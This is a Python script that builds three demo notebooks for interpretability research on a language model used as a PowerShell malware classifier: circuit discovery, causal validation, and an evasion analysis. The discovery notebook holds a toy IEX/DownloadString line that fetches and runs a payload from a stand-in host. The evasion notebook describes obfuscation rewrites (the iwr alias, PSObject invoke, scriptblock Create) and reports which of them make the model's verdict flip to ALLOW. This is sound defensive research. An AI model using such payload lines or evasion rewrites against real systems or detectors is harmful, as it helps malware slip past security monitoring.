#!/usr/bin/env python3
"""Generate the three demo notebooks described in PLAN.md.

The notebooks are intentionally CPU-friendly by default: they read existing
artifacts, produce visualizations, and explain the methodology. Optional rerun
cells are included only as commented examples for heavier local recomputation.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path


def md_cell(text: str) -> dict:
    normalized = textwrap.dedent(text).strip()
    return {
        "cell_type": "markdown",
        "metadata": {},
        "source": [line + "\n" for line in normalized.splitlines()],
    }


def code_cell(code: str) -> dict:
    normalized = textwrap.dedent(code).strip()
    return {
        "cell_type": "code",
        "execution_count": None,
        "metadata": {},
        "outputs": [],
        "source": [line + "\n" for line in normalized.splitlines()],
    }


NOTEBOOK_METADATA = {
    "kernelspec": {
        "display_name": "Python 3",
        "language": "python",
        "name": "python3",
    },
    "language_info": {
        "name": "python",
        "version": "3.12",
    },
}


COMMON_SETUP = """
from pathlib import Path
import math
import textwrap

import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns

sns.set_theme(
    context="talk",
    style="whitegrid",
    palette="deep",
    rc={
        "figure.dpi": 120,
        "axes.spines.top": False,
        "axes.spines.right": False,
        "axes.facecolor": "#FCFCFC",
        "figure.facecolor": "white",
        "grid.color": "#D9DDE3",
        "grid.linewidth": 0.8,
        "axes.edgecolor": "#4A5568",
        "axes.labelcolor": "#1A202C",
        "xtick.color": "#2D3748",
        "ytick.color": "#2D3748",
        "axes.titleweight": "semibold",
    },
)
pd.set_option("display.max_colwidth", 120)
pd.set_option("display.width", 140)


def find_project_root() -> Path:
    candidates = [Path.cwd()] + list(Path.cwd().parents)
    for candidate in candidates:
        if (candidate / "artifacts").exists() and (candidate / "scaled_validation.py").exists():
            return candidate
        if (candidate / "mech-interp-circuit" / "artifacts").exists():
            return candidate / "mech-interp-circuit"
    raise FileNotFoundError("Could not find mech-interp-circuit project root from the current working directory.")


PROJECT_ROOT = find_project_root()
ARTIFACTS = PROJECT_ROOT / "artifacts"
print("Project root:", PROJECT_ROOT)
print("Artifacts dir:", ARTIFACTS)


def read_csv(name: str) -> pd.DataFrame:
    path = ARTIFACTS / name
    if not path.exists():
        raise FileNotFoundError(path)
    return pd.read_csv(path)


def clip_text(text: str, *, width: int = 180) -> str:
    text = str(text).strip().replace("\\r\\n", "\\n")
    text = " ".join(text.split())
    if len(text) <= width:
        return text
    return text[: width - 3] + "..."


def show_barh(df, label_col, value_col, *, title, xlabel, color="#2B6CB0", sort=True):
    plot_df = df.copy()
    if sort:
        plot_df = plot_df.sort_values(value_col, ascending=True)
    fig, ax = plt.subplots(figsize=(8, max(3, 0.45 * len(plot_df))))
    sns.barplot(data=plot_df, x=value_col, y=label_col, ax=ax, color=color, orient="h")
    ax.set_title(title)
    ax.set_xlabel(xlabel)
    ax.set_ylabel("")
    sns.despine(ax=ax, left=False, bottom=False)
    plt.tight_layout()
    return fig, ax
"""


DISCOVERY_NOTEBOOK = [
    md_cell(
        """
        # 01. Circuit Discovery

        This notebook demonstrates the **discovery phase** of the project.

        It uses the original short pilot artifacts to show how the candidate circuit was found.
        Those pilot artifacts are useful for intuition and hypothesis generation, but they are **not**
        the final evidentiary basis for the repo's active claim. The current validated claim is based
        on the 96-pair cohort in Notebook 2.

        In mechanistic interpretability terms, this phase asks:
        - Where in the model does the malicious-vs-benign decision start to appear?
        - Which attention heads repeatedly focus on suspicious PowerShell indicators?
        - Which later layers look like they carry the decision toward the final `BLOCK` or `ALLOW` output?

        In plain language, the question is:
        - What parts of the model seem to notice risky code patterns early?
        - What parts of the model seem to turn those early clues into a final judgment later?

        This notebook is **CPU-friendly by default**. It reads the artifact files produced by the main analysis pipeline and uses plots to explain the methodology and the results.
        """
    ),
    code_cell(COMMON_SETUP),
    md_cell(
        """
        ## Step 1: Load the discovery artifacts

        We use two main artifact families here:
        - an **attention recurrence summary** that ranks heads by how often they focus on suspicious indicator tokens
        - a **full-model layer ablation summary** that shows which attention and MLP blocks matter most when they are removed

        Together, these tell a coherent story:
        - early attention heads do pattern detection
        - later layers do decision consolidation
        """
    ),
    code_cell(
        """
        attention_summary = read_csv("circuit_val_batch_attention_l4_n18_h100_summary.csv")
        layer_ablation = read_csv("circuit_val_layer_ablation_full_h100_summary.csv")

        attention_summary.head(10)
        """
    ),
    md_cell(
        """
        ## Step 2: Identify the early detector heads

        The chart below ranks the most recurrent heads in the short pilot overlap-controlled cohort.

        Technical interpretation:
        - a larger `mean_attention_delta` means the head attends more strongly to suspicious indicator positions than to matched random control positions

        Non-jargon interpretation:
        - these are the heads that most consistently "look at the suspicious parts" of the script
        """
    ),
    code_cell(
        """
        top_heads = attention_summary.head(10).copy()
        top_heads["head_label"] = top_heads.apply(lambda row: f"L{int(row['layer'])}H{int(row['head'])}", axis=1)
        show_barh(
            top_heads,
            "head_label",
            "mean_attention_delta",
            title="Top Recurrent Heads by Attention to Suspicious Indicators",
            xlabel="Mean attention delta",
            color="#C05621",
            sort=True,
        )
        plt.show()

        top_heads[["head_label", "pair_count", "mean_attention_delta", "max_attention_delta"]]
        """
    ),
    md_cell(
        """
        ## Step 2b: A simple `circuitsvis` illustration

        The next cell is a **teaching visualization**, not a direct model cache readout.
        It highlights suspicious surface tokens in a toy PowerShell example so a reader can see the kind of evidence the early detector heads are picking up.

        Why include this?
        - It gives a non-jargon visual intuition for "indicator-focused attention"
        - It uses the same sort of suspicious strings that appear throughout the real dataset
        """
    ),
    code_cell(
        """
        from circuitsvis.tokens import colored_tokens
        from IPython.display import display

        demo_script = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
        demo_tokens = demo_script.split()
        suspicious_terms = ["IEX", "Net.WebClient", "DownloadString"]
        demo_values = [
            1.0 if any(term in token for term in suspicious_terms) else 0.0
            for token in demo_tokens
        ]

        display(colored_tokens(tokens=demo_tokens, values=demo_values))
        """
    ),
    md_cell(
        """
        ## Step 3: Localize the later decision stage

        Head-level attention is only part of the story. We also want to know where the model becomes **causally fragile**:
        if we remove a whole layer component, how much does the malicious-vs-benign logit move?

        We split the ablation results into:
        - **attention components**: token-to-token communication
        - **MLP components**: feedforward transformations inside each block
        """
    ),
    code_cell(
        """
        ablation_plot = layer_ablation.copy()
        ablation_plot["signed_effect"] = -ablation_plot["mean_delta"]

        fig, axes = plt.subplots(1, 2, figsize=(13, 5), sharey=True)
        for ax, component, color in zip(axes, ["attn", "mlp"], ["#2F855A", "#805AD5"]):
            subset = ablation_plot[ablation_plot["component"] == component].sort_values("signed_effect", ascending=False).head(12)
            ax.bar(subset["layer"].astype(str), subset["signed_effect"], color=color)
            ax.set_title(f"Top {component.upper()} Layers by Ablation Effect")
            ax.set_xlabel("Layer")
            ax.set_ylabel("- mean_delta (larger = more important)")
        plt.tight_layout()
        plt.show()

        layer_ablation.sort_values("mean_delta").head(12)
        """
    ),
    md_cell(
        """
        ## Step 4: Interpret the discovery phase

        The discovery phase supports a two-stage circuit hypothesis:

        1. **Early detection**
           Heads in `Layer 0`, especially `L0H11` and `L0H9`, repeatedly focus on suspicious PowerShell indicators such as `IEX`, `DownloadString`, `Invoke-WebRequest`, and `-EncodedCommand`.

        2. **Late decision consolidation**
           A later band, especially `Layer 12-13` attention and a broader MLP band, appears to carry and refine the final malicious-vs-benign decision.

        This does **not** yet prove the final repo claim by itself. It tells us where to intervene next.
        The 96-pair validation notebook is where the active claim is tested.
        """
    ),
    md_cell(
        """
        ## Optional: Lightweight recomputation notes

        If you want to rerun small parts of the discovery workflow locally, use `scaled_validation.py`.
        The heavier model-intervention runs are better on GPU, but the artifact-reading workflow in this notebook is designed to work comfortably on CPU.
        """
    ),
    code_cell(
        """
        # Example only. Uncomment to run a small discovery command locally.
        #
        # !python ../scaled_validation.py batch-discover-heads \\
        #     --manifest ../artifacts/circuit_val_pair_manifest_t3000_valid_causal18_short.csv \\
        #     --device cpu \\
        #     --torch-dtype float32 \\
        #     --num-pairs 2 \\
        #     --first-n-layers 4 \\
        #     --output-prefix ../artifacts/demo_discovery_cpu
        """
    ),
]


VALIDATION_NOTEBOOK = [
    md_cell(
        """
        # 02. Circuit Validation

        This notebook demonstrates the **causal validation phase**.

        Discovery tells us where to look. This notebook asks the stricter question on the
        **96-pair within-family matched cohort** that now anchors the repo's active claim:
        - If we remove or replace part of the model state, does the decision actually change?

        In mechanistic terms, this notebook focuses on:
        - **grouped path patching** for sufficiency
        - **grouped head ablation** for necessity
        - comparison between a minimal direct route and a broader late carrier

        In plain language:
        - What parts of the model are actually doing causal work?
        - Which parts are just nearby or correlated?
        """
    ),
    code_cell(COMMON_SETUP),
    md_cell(
        """
        ## Step 1: Load the core validation artifacts

        We use grouped late-route patching and ablation summaries on the 96-pair cohort.
        Historical 18-pair pilot artifacts are intentionally excluded from the main validation narrative.
        """
    ),
    code_cell(
        """
        route_minimal = read_csv("circuit_val_path_patching_h011_plus_l12_top3_combo96_h100_summary.csv")
        route_top5 = read_csv("circuit_val_path_patching_l12_writer_top5_combo96_h100_summary.csv")
        route_minus_h2 = read_csv("circuit_val_path_patching_l12_writer_minus_h2_combo96_h100_summary.csv")
        route_minus_h28 = read_csv("circuit_val_path_patching_l12_writer_minus_h28_combo96_h100_summary.csv")
        ablate_minimal = read_csv("circuit_val_head_group_ablation_l12_h011_route_combo96_h100_summary.csv")
        ablate_top5 = read_csv("circuit_val_head_group_ablation_l12_writer_top5_combo96_h100_summary.csv")
        ablate_minus_h2 = read_csv("circuit_val_head_group_ablation_l12_writer_minus_h2_combo96_h100_summary.csv")
        ablate_h28 = read_csv("circuit_val_head_group_ablation_l12_writer_h28_combo96_h100_summary.csv")

        route_minimal
        """
    ),
    md_cell(
        """
        ## Step 2: Compare the candidate late routes by path patching

        Path patching tests sufficiency: if we replace a candidate route with the benign version,
        how much does the malicious-vs-benign decision move?
        """
    ),
    code_cell(
        """
        route_rows = [
            ("Minimal direct route", float(route_minimal["mean_delta"].iloc[0]), float(route_minimal["flip_rate"].iloc[0])),
            ("Top-5 late bundle", float(route_top5["mean_delta"].iloc[0]), float(route_top5["flip_rate"].iloc[0])),
            ("Top-4 without H2", float(route_minus_h2["mean_delta"].iloc[0]), float(route_minus_h2["flip_rate"].iloc[0])),
            ("Top-4 without H28", float(route_minus_h28["mean_delta"].iloc[0]), float(route_minus_h28["flip_rate"].iloc[0])),
        ]
        route_df = pd.DataFrame(route_rows, columns=["route", "mean_delta", "flip_rate"])

        fig, axes = plt.subplots(1, 2, figsize=(13, 4))
        axes[0].bar(route_df["route"], route_df["mean_delta"], color="#2F855A")
        axes[0].set_title("Path Patching on 96-Pair Cohort")
        axes[0].set_ylabel("Mean logit delta")
        axes[0].tick_params(axis="x", rotation=20)

        axes[1].bar(route_df["route"], route_df["flip_rate"], color="#2B6CB0")
        axes[1].set_title("Flip Rate on 96-Pair Cohort")
        axes[1].set_ylabel("Flip rate")
        axes[1].tick_params(axis="x", rotation=20)

        plt.tight_layout()
        plt.show()

        route_df
        """
    ),
    md_cell(
        """
        ## Step 2b: Visualize a validated upstream attention head

        The grouped route result tells us which path matters, but it does not show what one of the important heads is actually attending to.

        The optional cell below loads a real malicious prompt from the 96-pair cohort, runs a cached forward pass, and opens a `circuitsvis` attention-pattern viewer for `L0H11`, the cleanest validated upstream head in the writeup.

        This is intentionally separate from the CSV-only workflow because it is heavier:
        - it loads the model
        - it computes a real attention cache
        - it visualizes the full head-pattern tensor so the reader can inspect it interactively
        """
    ),
    code_cell(
        """
        # Optional heavier cell: inspect a real attention pattern for the validated upstream head.
        #
        # import circuitsvis as cv
        # import sys
        #
        # sys.path.append(str(PROJECT_ROOT))
        # from scaled_validation import build_hooked_transformer, load_hf_model_and_tokenizer, make_prompt
        #
        # manifest = read_csv("circuit_val_pair_manifest_t3000_combo_cap20_valid_h100.csv")
        # mal_row = (
        #     manifest[(manifest["label"] == "malicious") & (manifest["pair_indicator"] == "Invoke-WebRequest")]
        #     .sort_values("logit_diff", ascending=False)
        #     .iloc[0]
        # )
        #
        # BEST_LAYER, BEST_HEAD = 0, 11
        # hf_model, tokenizer, device = load_hf_model_and_tokenizer(device="cpu", torch_dtype="float32")
        # model = build_hooked_transformer(
        #     hf_model,
        #     tokenizer,
        #     device=device,
        #     torch_dtype="float32",
        #     template_name="meta-llama/Llama-3.1-8B-Instruct",
        #     first_n_layers=4,
        #     use_attn_result=False,
        # )
        #
        # prompt = make_prompt(mal_row["content"])
        # mal_toks = model.to_tokens(prompt)
        # _, mal_cache = model.run_with_cache(mal_toks, return_type="logits")
        #
        # pattern_key = f"blocks.{BEST_LAYER}.attn.hook_pattern"
        # attn_pattern = mal_cache[pattern_key][0].detach().cpu().numpy()
        # tok_strs = [model.to_string(t.unsqueeze(0)) for t in mal_toks[0]]
        #
        # cv.attention.attention_patterns(attention=attn_pattern, tokens=tok_strs)
        """
    ),
    md_cell(
        """
        ## Step 3: Compare the same routes by grouped ablation

        Grouped ablation tests necessity: if we zero a candidate late route, how much of the
        malicious decision disappears?

        This is also where the role of `H2` changes. On the 96-pair cohort, removing `H2`
        improves patching, but including it strengthens grouped ablation.
        """
    ),
    code_cell(
        """
        ablation_rows = [
            ("Minimal late route", float(ablate_minimal["mean_delta"].iloc[0]), float(ablate_minimal["flip_rate"].iloc[0])),
            ("Top-5 late bundle", float(ablate_top5["mean_delta"].iloc[0]), float(ablate_top5["flip_rate"].iloc[0])),
            ("Top-4 without H2", float(ablate_minus_h2["mean_delta"].iloc[0]), float(ablate_minus_h2["flip_rate"].iloc[0])),
            ("Top-4 without H28", float(ablate_h28["mean_delta"].iloc[0]), float(ablate_h28["flip_rate"].iloc[0])),
        ]
        ablation_df = pd.DataFrame(ablation_rows, columns=["route", "mean_delta", "flip_rate"])

        fig, axes = plt.subplots(1, 2, figsize=(13, 4))
        axes[0].bar(ablation_df["route"], ablation_df["mean_delta"], color="#C53030")
        axes[0].set_title("Grouped Ablation on 96-Pair Cohort")
        axes[0].set_ylabel("Mean logit delta")
        axes[0].tick_params(axis="x", rotation=20)

        axes[1].bar(ablation_df["route"], ablation_df["flip_rate"], color="#2B6CB0")
        axes[1].set_title("Flip Rate After Grouped Ablation")
        axes[1].set_ylabel("Flip rate")
        axes[1].tick_params(axis="x", rotation=20)

        plt.tight_layout()
        plt.show()

        ablation_df
        """
    ),
    md_cell(
        """
        ## Step 4: What the 96-pair validation phase shows

        The cleanest final validation claim is:

        - the cleanest minimal direct route is `L0H11 -> L12H15/L12H5/L12H4`
        - the cleaner sufficiency-oriented late carrier is `L12H15/L12H5/L12H4/L12H28`
        - `L12H2` behaves more like a family-sensitive helper than a stable core writer
        - these are the claims the repo now treats as validated, because they are measured directly on the 96-pair cohort

        This is why the repo writeup separates:
        - a **minimal direct branch** for mechanistic clarity
        - a **broader late carrier** for stronger sufficiency on the larger cohort
        """
    ),
    md_cell(
        """
        ## Optional: Rerun notes

        The commands below are examples only. They are usually more comfortable on GPU, but they document exactly how the validation artifacts were produced.
        """
    ),
    code_cell(
        """
        # Example only. Uncomment to rerun a small validation command.
        #
        # !python ../scaled_validation.py batch-head-group-ablation \\
        #     --manifest ../artifacts/circuit_val_pair_manifest_t3000_combo_cap20_valid_h100.csv \\
        #     --heads 12.15,12.5,12.4,12.28 \\
        #     --device cpu \\
        #     --torch-dtype float32 \\
        #     --num-pairs 2 \\
        #     --allow-zero-indicator-malicious \\
        #     --output-prefix ../artifacts/demo_validation_cpu
        """
    ),
]


EVASION_NOTEBOOK = [
    md_cell(
        """
        # 03. Evasion Analysis

        This notebook demonstrates the **robustness and evasion phase** of the project.

        The main question is no longer "what circuit exists?" but:
        - what happens to that circuit under conservative, runnable obfuscation?

        In mechanistic terms:
        - Does obfuscation remove the validated route?
        - Or does the model still represent the malicious evidence internally, while changing how it uses that evidence downstream?

        In plain language:
        - Is the model actually fooled because it stops seeing the danger?
        - Or does it still "notice" the danger, but fail to rely on it by the end?
        """
    ),
    code_cell(COMMON_SETUP),
    md_cell(
        """
        ## Step 1: Load the evasion benchmark artifacts

        We use:
        - the expanded technique-level benchmark summary
        - a family-level summary of the strict candidate benchmark slices
        - a provisional summary that adds the pure `IEX` slice without changing the strict benchmark
        - late-carrier patching on the strongest evasion slice
        - slice-specific residual and tracing summaries for the final downstream analysis
        """
    ),
    code_cell(
        """
        benchmark = read_csv("evasion_candidate_benchmark_summary_v3.csv")
        family_benchmark = read_csv("evasion_candidate_family_summary_v3.csv")
        benchmark_provisional = read_csv("evasion_candidate_benchmark_summary_provisional_v1.csv")
        patch_variant = read_csv("evasion_path_patching_late_invoke_webrequest_variant_v2_h100_summary.csv")
        trace_variant = read_csv("evasion_trace_resid_pre13_mean_delta_l12_invoke_webrequest_variant_v2_h100_summary.csv")
        resid_pre31_variant = read_csv("evasion_resid_pre31_mean_delta_ablate_l12_top4_invoke_webrequest_variant_v2_h100_summary.csv")

        benchmark
        """
    ),
    md_cell(
        """
        ## Step 2: Which evasion techniques actually work?

        A useful evasion benchmark should not treat every string rewrite as equally meaningful.
        Here, the important outcome is whether a conservative, syntax-preserving transform actually flips the model from `BLOCK` to `ALLOW`.

        In the current strict candidate run:
        - `invoke_webrequest_alias` remains the strongest miss pattern
        - `downloadstring_psobject_invoke` still produces a narrower miss pattern
        - `downloadfile_psobject_invoke` and `split_quoted_encodedcommand_literal` are now benchmarked too, but do **not** produce misses on their current slices
        - pure `IEX` variants now appear in a separate provisional tier, so the strict benchmark stays unchanged while the extra slice is still measured
        """
    ),
    md_cell(
        """
        ## Step 2a: What the technique names mean

        The benchmark technique ids are compact implementation labels. For a new reader, it is much easier to reason about the results if each method is translated into plain language first.

        The main methods shown in this notebook are:
        - `invoke_webrequest_alias`: replace the full command name `Invoke-WebRequest` with the shorter built-in alias `iwr`
        - `downloadstring_psobject_invoke`: hide a direct `.DownloadString(...)` call behind `PSObject.Methods[...]`
        - `downloadfile_psobject_invoke`: do the same for `.DownloadFile(...)`
        - `split_quoted_encodedcommand_literal`: replace a quoted `-EncodedCommand` string with concatenated pieces such as `"-Encoded" + "Command "`
        - `iex_scriptblock_create`: replace direct `iex ...` execution with `&([scriptblock]::Create(...))`

        All of these are meant to preserve behavior while reducing an obvious literal surface that the model may rely on.
        """
    ),
    code_cell(
        """
        technique_defs = pd.DataFrame(
            [
                ("invoke_webrequest_alias", "Use the alias iwr instead of the full Invoke-WebRequest command name.", "strict"),
                ("downloadstring_psobject_invoke", "Rewrite .DownloadString(...) as a PSObject method lookup plus Invoke.", "strict"),
                ("downloadfile_psobject_invoke", "Rewrite .DownloadFile(...) as a PSObject method lookup plus Invoke.", "strict"),
                ("split_quoted_encodedcommand_literal", "Split a quoted -EncodedCommand literal into concatenated string pieces.", "strict"),
                ("iex_scriptblock_create", "Replace direct iex execution with &([scriptblock]::Create(...)).", "provisional"),
            ],
            columns=["technique_id", "plain_language_definition", "benchmark_tier"],
        )

        technique_defs
        """
    ),
    md_cell(
        """
        ## Step 2b: Seed and variant examples

        The next table makes the benchmark concrete by showing one original malicious seed snippet and one semantically equivalent evasion variant snippet for each major method.

        This matters because the benchmark is not just "random obfuscation." The reader should be able to inspect the before-and-after strings and see exactly what changed.
        """
    ),
    code_cell(
        """
        seed_manifest = read_csv("evasion_seed_manifest_v2.csv")
        variant_strict = read_csv("evasion_variant_manifest_candidate_v3.csv")
        variant_provisional = read_csv("evasion_variant_manifest_candidate_provisional_v1.csv")
        variant_all = pd.concat([variant_strict, variant_provisional], ignore_index=True).drop_duplicates(subset=["variant_id"])

        example_techniques = [
            "invoke_webrequest_alias",
            "downloadstring_psobject_invoke",
            "downloadfile_psobject_invoke",
            "split_quoted_encodedcommand_literal",
            "iex_scriptblock_create",
        ]

        example_rows = []
        for technique_id in example_techniques:
            subset = variant_all[variant_all["technique_id"] == technique_id].copy()
            if subset.empty:
                continue
            row = subset.sort_values(["used_char_len", "filename"]).iloc[0]
            seed_row = seed_manifest[seed_manifest["seed_id"] == row["seed_id"]].iloc[0]
            example_rows.append(
                {
                    "technique_id": technique_id,
                    "tier": row.get("candidate_tier", "strict"),
                    "indicator_family": seed_row["primary_indicator"],
                    "seed_example": clip_text(seed_row["content"], width=220),
                    "variant_example": clip_text(row["content"], width=220),
                }
            )

        pd.DataFrame(example_rows)
        """
    ),
    code_cell(
        """
        plot_df = benchmark.sort_values("evasion_success_rate", ascending=True)
        fig, ax = plt.subplots(figsize=(9, 4.5))
        ax.barh(plot_df["technique_id"], plot_df["evasion_success_rate"], color="#B83280")
        ax.set_title("Evasion Success Rate by Technique")
        ax.set_xlabel("Evasion success rate")
        plt.tight_layout()
        plt.show()

        benchmark.sort_values("evasion_success_rate", ascending=False)
        """
    ),
    md_cell(
        """
        ## Step 2c: Family-level coverage in the current benchmark

        The technique summary is useful, but it hides which indicator families are actually represented.
        This table makes the current benchmark boundary explicit:
        - `DownloadFile` and `-EncodedCommand` now have strict candidate slices with zero misses
        - the strongest misses still come from `Invoke-WebRequest` and the narrower `FromBase64String`-linked `DownloadString` route
        - pure `IEX` now sits in a separate provisional tier with zero misses on the current slice
        """
    ),
    code_cell(
        """
        family_benchmark
        """
    ),
    md_cell(
        """
        ## Step 2d: Provisional `IEX` coverage

        We do not fold these rows into the strict benchmark because they still lack runtime-side parse validation in the current environment.
        But we *do* measure them separately so the benchmark can report what happens on the pure `IEX` slice without silently weakening its main admission rule.
        """
    ),
    code_cell(
        """
        benchmark_provisional[benchmark_provisional["candidate_tier"] == "provisional_iex"]
        """
    ),
    md_cell(
        """
        ## Step 3: The first key surprise

        On the strongest failure mode, `invoke_webrequest_alias`, the validated late carrier is still **sufficient**.

        That means:
        - if we patch the old late bundle back in, we can still push the model toward the malicious decision

        In plain language:
        - the model still knows how to use the old signal if we force it to
        - but in the naturally evaded script, it is no longer relying on that signal in the same way
        """
    ),
    code_cell(
        """
        patch_variant
        """
    ),
    md_cell(
        """
        ## Step 4: Trace the late writer family on the evaded variants

        The next question is whether the late carrier disappeared.

        To test that, we trace which `Layer 12` heads write most strongly into the slice-specific `resid_pre13` malicious-vs-benign direction for the evaded variants.
        """
    ),
    code_cell(
        """
        top_trace = trace_variant.head(10).copy()
        top_trace["head_label"] = top_trace.apply(lambda row: f"L{int(row['layer'])}H{int(row['head'])}", axis=1)

        show_barh(
            top_trace,
            "head_label",
            "mean_delta_projection",
            title="Late Writers Into the Variant-Slice resid_pre13 Direction",
            xlabel="Mean delta projection",
            color="#2C7A7B",
            sort=True,
        )
        plt.show()

        top_trace[["head_label", "mean_delta_projection", "positive_delta_frac"]]
        """
    ),
    md_cell(
        """
        ### Interpretation

        The usual late writer family does **not** disappear.

        The familiar heads are still there:
        - `L12H15` remains dominant
        - `H5`, `H2`, and `H28` remain in the main positive writer set

        So the evasion is **not** well described as "the model no longer carries the malicious evidence."
        """
    ),
    md_cell(
        """
        ## Step 5: The final downstream probe

        The strongest final test asks where the sign split shows up.

        Earlier in the late stage, at `resid_pre13`, the late bundle still writes the familiar malicious-evidence direction even on evaded variants.

        Later, at `resid_pre31`, we test whether ablating the same late bundle still moves the late residual in the same direction.
        """
    ),
    code_cell(
        """
        resid_pre31_variant
        """
    ),
    md_cell(
        """
        ## Final interpretation

        This is the core robustness result:

        - the validated late carrier survives the evasion at `resid_pre13`
        - but later blocks transform or compensate for that evidence differently
        - by `resid_pre31`, the anti-causal split is already visible in the residual stream itself

        In plain language:
        - the model still contains the danger signal
        - but later computation has changed how much the final answer depends on that signal

        That is stronger and more precise than saying the circuit was simply "broken."
        """
    ),
    md_cell(
        """
        ## Optional: Rerun notes

        These commands are GPU-friendly rather than CPU-friendly in practice, but they document the exact downstream probe used in the final writeup.
        """
    ),
    code_cell(
        """
        # Example only. Uncomment to rerun the final downstream probe.
        #
        # !python ../scaled_validation.py batch-residual-direction-intervention \\
        #     --manifest ../artifacts/evasion_pair_manifest_invoke_webrequest_variant_v2.csv \\
        #     --basis-path ../artifacts/evasion_invoke_webrequest_variant_v2_resid_pre31_contrastive_h100_basis.pt \\
        #     --basis-label mean_delta \\
        #     --heads 12.15,12.5,12.4,12.28 \\
        #     --mode ablate \\
        #     --device cuda \\
        #     --torch-dtype float16 \\
        #     --num-pairs 4 \\
        #     --allow-zero-indicator-malicious \\
        #     --output-prefix ../artifacts/demo_evasion_probe
        """
    ),
]


def notebook(cells: list[dict]) -> dict:
    return {
        "cells": cells,
        "metadata": NOTEBOOK_METADATA,
        "nbformat": 4,
        "nbformat_minor": 5,
    }


def write_notebook(path: Path, cells: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(notebook(cells), indent=2) + "\n", encoding="utf-8")


def main() -> None:
    root = Path(__file__).resolve().parent
    notebooks_dir = root / "notebooks"
    write_notebook(notebooks_dir / "01_circuit_discovery.ipynb", DISCOVERY_NOTEBOOK)
    write_notebook(notebooks_dir / "02_circuit_validation.ipynb", VALIDATION_NOTEBOOK)
    write_notebook(notebooks_dir / "03_evasion_analysis.ipynb", EVASION_NOTEBOOK)
    print(f"Wrote notebooks to {notebooks_dir}")


if __name__ == "__main__":
    main()
